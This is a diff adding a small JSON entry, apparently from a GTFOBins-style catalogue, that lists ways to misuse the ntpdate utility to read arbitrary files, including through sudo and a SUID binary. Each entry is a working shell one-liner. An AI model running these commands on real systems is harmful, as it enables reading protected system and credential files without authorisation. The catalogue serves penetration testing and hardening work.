@@ -1,0 +1,22 @@
+{
+  "functions": {
+    "file-read": [
+      {
+        
+        "code": "LFILE=file_to_read\nntpdate -a x -k $LFILE -d localhost\n"
+      }
+    ],
+    "sudo": [
+      {
+        
+        "code": "LFILE=file_to_read\nsudo ntpdate -a x -k $LFILE -d localhost\n"
+      }
+    ],
+    "suid": [
+      {
+        
+        "code": "LFILE=file_to_read\n./ntpdate -a x -k $LFILE -d localhost\n"
+      }
+    ]
+  }
+}
